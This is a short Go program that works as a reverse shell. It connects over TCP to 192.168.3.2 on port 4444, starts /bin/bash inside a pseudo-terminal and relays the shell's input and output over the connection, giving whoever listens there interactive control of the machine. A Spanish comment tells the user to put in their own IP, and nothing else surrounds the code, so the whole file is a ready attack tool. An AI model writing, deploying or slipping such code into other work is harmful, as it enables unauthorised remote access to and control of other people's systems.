package main

import (
	"io"
	"net"
	"os/exec"

	"github.com/creack/pty"
)

func main() {
	conn, err := net.Dial("tcp", "192.168.3.2:4444") // reemplaza TU_IP con tu IP real
	if err != nil {
		return
	}
	defer conn.Close()

	cmd := exec.Command("/bin/bash")
	ptmx, err := pty.Start(cmd)
	if err != nil {
		return
	}
	defer ptmx.Close()

	go io.Copy(conn, ptmx)
	io.Copy(ptmx, conn)
}
